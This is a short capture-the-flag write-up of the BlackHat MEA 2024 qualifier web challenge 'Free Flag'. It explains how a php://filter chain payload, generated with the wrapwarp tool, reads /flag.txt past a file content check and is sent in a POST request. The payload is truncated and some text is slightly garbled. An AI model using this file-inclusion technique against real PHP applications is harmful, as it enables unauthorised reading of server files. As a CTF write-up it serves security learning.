---
title: "Free Flag - BlackHat MEA CTF Qualification 2024"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "php-filter", "base64", "free", "lfi", "blackhat-mea-ctf-qualification", "blackhat-mea-ctf-qualification-202", "2024", "ctf-writeup"]
summary: "To bypass the file content check, a malicious payload can be crafted using the wrapwarp tool."
source:
  name: "CTFtime writeup #39420"
  url: "https://ctftime.org/writeup/39420"
original_source: "https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/blob/main/Free%20Flag.md"
ctf:
  name: "BlackHat MEA CTF Qualification 2024"
  year: 2024
  challenge: "Free Flag"
---

## Metadata

- **CTF:** BlackHat MEA CTF Qualification 2024
- **Task:** Free Flag
- **Author team:** cyber_blitz
- **CTFtime:** <https://ctftime.org/writeup/39420>
- **Original writeup:** <https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/blob/main/Free%20Flag.md>

---
# Free Flag Writeup

\- **Category:** Web  
\- **Points:** 110  
\- **Difficulty:** Easy

## Challenge Description

Free Free

## Challenge Files

[here](<https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/tree/main/FreeFlag-src>).

### Exploiting

To bypass the file content check, a malicious payload can be crafted using the `wrapwarp` tool. The following command generates the payload:

```bash  
python3 [wrapwarp.py](http://wrapwarp.py) /flag.txt "" 100

Generated Payload:

php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-……………………….........  
```  
### Get Flag  
Once the payload is generated, it is transmitted via a POST request. This payload enables the retrieval of the flag by embedding it between , thereby circumventing the file content check.

![image](<https://github.com/user-attachments/assets/68a070bf-cf4d-46e7-825c-ed04690981e8>)
